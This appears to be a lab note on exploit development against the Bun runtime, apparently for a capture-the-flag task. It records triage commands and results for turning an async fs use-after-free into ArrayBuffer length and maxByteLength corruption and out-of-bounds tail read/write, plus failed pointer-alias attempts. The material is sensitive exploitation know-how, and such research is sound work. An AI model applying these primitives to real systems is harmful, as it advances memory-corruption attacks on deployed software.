# ArrayBuffer metadata primitives - 2026-05-10

Scope: local ArrayBuffer/TypedArray metadata escalation from the async `fs`
BufferSource UAF. All fresh harnesses are under
`lab/harnesses/15-arraybuffer-metadata/`.

All triage runs used the ASAN Bun binary through `lab/scripts/triage.sh` with:

```sh
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:allocator_may_return_null=1:quarantine_size_mb=0
```

## Harnesses

- `fs-read-metadata-field-matrix.js`: offset/value sweep across fixed
  `ArrayBuffer`, `Uint8Array`, `DataView`, non-zero-offset views, and RAB views.
- `fs-read-rab-expanded-oob.js`: focused RAB probe for corrupting current
  length and max length, then constructing fresh views or resizing.
- `fs-arraybuffer-pointer-field-sweep.js`: two-stage metadata leak and pointer
  candidate writeback/alias check.

## Confirmed stable fields

### Offset 48: ArrayBuffer current byteLength

Representative command:

```sh
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:allocator_may_return_null=1:quarantine_size_mb=0 \
TIMEOUT=30 ITERATIONS=16 OFFSETS=48 VALUES=64,129,256,512 \
SPRAY_MODE=u8 STOP_ON_CHANGE=0 \
lab/scripts/triage.sh lab/harnesses/15-arraybuffer-metadata/fs-read-metadata-field-matrix.js
```

Log: `lab/findings/runs/20260510T034255Z-15310/asan.log`

Result: offset `48` directly controls `buffer.byteLength`/`maxByteLength` on
fixed ArrayBuffers. Values `64`, `129`, `256`, and `512` were observed. The
retained typed view's own `length`, `byteLength`, and `byteOffset` stayed
unchanged at `128`, `128`, and `0`.

The same offset-48 behavior reproduced for:

- `u8-offset`: `lab/findings/runs/20260510T034325Z-18377/asan.log`
- `dataview`: `lab/findings/runs/20260510T034325Z-18378/asan.log`
- `dataview-offset`: `lab/findings/runs/20260510T034325Z-18425/asan.log`
- direct retained `ArrayBuffer`: shrink observed in
  `lab/findings/runs/20260510T034325Z-18426/asan.log`

Assessment: fixed-buffer offset `48` is stable length inflation/shrink, but not
by itself a safe adjacent heap OOB primitive under ASAN. Prior fresh-view read
past a fixed 128-byte backing still crashes in ASAN redzone.

### Offset 48 + RAB: safe expanded byte-view read/write in reserved tail

Representative commands:

```sh
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:allocator_may_return_null=1:quarantine_size_mb=0 \
TIMEOUT=30 ITERATIONS=64 RAB_INITIAL=128 RAB_MAX=256 \
WRITE_OFFSET=48 NEW_VALUE=256 TOUCH_MODE=read \
lab/scripts/triage.sh lab/harnesses/15-arraybuffer-metadata/fs-read-rab-expanded-oob.js
```

```sh
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:allocator_may_return_null=1:quarantine_size_mb=0 \
TIMEOUT=30 ITERATIONS=64 RAB_INITIAL=128 RAB_MAX=256 \
WRITE_OFFSET=48 NEW_VALUE=256 TOUCH_MODE=write \
lab/scripts/triage.sh lab/harnesses/15-arraybuffer-metadata/fs-read-rab-expanded-oob.js
```

Logs:

- `lab/findings/runs/20260510T034351Z-20870/asan.log`
- `lab/findings/runs/20260510T034351Z-20918/asan.log`

Result: creating a 256-byte RAB, filling bytes `128..255`, shrinking to 128,
then corrupting offset `48` to `256` makes a fresh `Uint8Array(buffer)` length
256. Reading index `128` returned the prefilled tail marker (`196` in the read
log). Writing index `128` changed the byte to `90`, and the value survived a
later legitimate `resize(256)`.

The same pattern reproduced at larger and smaller shapes:

- `RAB_INITIAL=128 RAB_MAX=512 PROBE_OFFSET=256`:
  `lab/findings/runs/20260510T034415Z-22382/asan.log` and
  `lab/findings/runs/20260510T034415Z-22383/asan.log`
- `RAB_INITIAL=64 RAB_MAX=256 PROBE_OFFSET=128`:
  `lab/findings/runs/20260510T034415Z-22430/asan.log`

Assessment: this is a stable JS-visible byte read/write past the current RAB
length into the pre-reserved backing tail. It is not an arbitrary native
read/write and it is not yet a groomed adjacent-object heap OOB.

### Offset 56: RAB maxByteLength

Representative command:

```sh
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:allocator_may_return_null=1:quarantine_size_mb=0 \
TIMEOUT=30 ITERATIONS=16 OFFSETS=56 VALUES=64,128,256,512 \
SPRAY_MODE=rab-u8 RAB_MAX=256 STOP_ON_CHANGE=0 \
lab/scripts/triage.sh lab/harnesses/15-arraybuffer-metadata/fs-read-metadata-field-matrix.js
```

Log: `lab/findings/runs/20260510T034548Z-29247/asan.log`

Result: offset `56` changes RAB `maxByteLength` without changing current
`byteLength` or typed-view fields. Values `64`, `128`, and `512` were observed.
The non-zero-offset RAB view behaved the same:
`lab/findings/runs/20260510T034548Z-29291/asan.log`.

Follow-up:

```sh
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:allocator_may_return_null=1:quarantine_size_mb=0 \
TIMEOUT=30 ITERATIONS=64 RAB_INITIAL=128 RAB_MAX=256 \
WRITE_OFFSET=56 NEW_VALUE=512 TOUCH_MODE=resize-write \
RESIZE_TO=512 PROBE_OFFSET=256 WRITE_VALUE=171 \
lab/scripts/triage.sh lab/harnesses/15-arraybuffer-metadata/fs-read-rab-expanded-oob.js
```

Log: `lab/findings/runs/20260510T034630Z-31532/asan.log`

Result: corrupting max to 512 allowed `resize(512)` and a write at index 256.
The byte at 256 was zero after resize, indicating normal growth/reallocation
rather than disclosure of the old 256-byte reserved tail beyond its capacity.

Assessment: maxByteLength corruption is a stable bounds-policy bypass for RAB
growth. It is less directly useful than current-length corruption for OOB tail
read/write.

## Crash-only or no-primitive fields

- Offset `32`, value `64`: corrupts an ArrayBuffer receiver/owner field.
  Accessing `buffer.byteLength` threw `Receiver must be ArrayBuffer`, followed
  by ASAN crashes at `0x40`. Logs:
  `20260510T034226Z-12709`, `20260510T034226Z-12718`,
  `20260510T034226Z-12719`.
- Offset `40`, value `64`: no JS-visible field change before ASAN SEGV at
  `0x40`. Log: `lab/findings/runs/20260510T034255Z-15309/asan.log`.
- Offset `64`: no JS-visible changes for values `64`, `128`, `256`, `512` over
  16 iterations each. Log: `lab/findings/runs/20260510T034255Z-15381/asan.log`.
- Offset `72`, value `64`: no JS-visible field change before ASAN SEGV at
  `0x40`. Same log: `20260510T034255Z-15381`.
- Offset `56` on fixed ArrayBuffers: no JS-visible changes for values `64`,
  `129`, `256`, `512` over 16 iterations each. Log:
  `lab/findings/runs/20260510T034255Z-15311/asan.log`.

No direct typed-view `byteOffset`, typed-view `length`, or typed-view
`byteLength` field write was obtained. Non-zero-offset `Uint8Array` and
`DataView` probes only changed the backing buffer's byteLength at offset `48`.

## Backing-pointer alias status

Representative pointer leak/write commands:

```sh
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:allocator_may_return_null=1:quarantine_size_mb=0 \
TIMEOUT=30 LEAK_ATTEMPTS=16 WRITE_ATTEMPTS=8 \
LEAK_OFFSETS=16 WRITE_OFFSETS=16 DELTAS=0 \
lab/scripts/triage.sh lab/harnesses/15-arraybuffer-metadata/fs-arraybuffer-pointer-field-sweep.js
```

```sh
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1:allocator_may_return_null=1:quarantine_size_mb=0 \
TIMEOUT=30 LEAK_ATTEMPTS=16 WRITE_ATTEMPTS=4 \
LEAK_OFFSETS=24 WRITE_OFFSETS=16 DELTAS=0 \
lab/scripts/triage.sh lab/harnesses/15-arraybuffer-metadata/fs-arraybuffer-pointer-field-sweep.js
```

Logs:

- `lab/findings/runs/20260510T034459Z-25880/asan.log`
- `lab/findings/runs/20260510T034459Z-25929/asan.log`
- `lab/findings/runs/20260510T034518Z-27649/asan.log`
- `lab/findings/runs/20260510T034518Z-27650/asan.log`

Result: metadata leaks repeatedly showed pointer-like words at offsets `8`,
`16`, `24`, and `80`. Installing offset-24 candidates at write offsets `16` or
`24` completed without crashes but produced no target anomalies and no alias
writes. Installing offset-8, offset-16, or offset-80 candidates led to ASAN
heap-buffer-overflow or invalid-free crashes before a usable alias was observed.

Assessment: no stable backing-store pointer alias primitive was obtained.

## Current status

Confirmed:

- fixed ArrayBuffer byteLength corruption at offset `48`
- RAB current byteLength corruption at offset `48`
- RAB maxByteLength corruption at offset `56`
- safe fresh-view byte read/write into a pre-reserved RAB tail after corrupting
  current byteLength
- RAB max growth bypass after corrupting maxByteLength

Not confirmed:

- arbitrary native read/write
- fixed ArrayBuffer adjacent-object OOB under ASAN
- direct typed-view length or byteOffset corruption
- stable backing-store pointer alias
- CTF request-path reachability
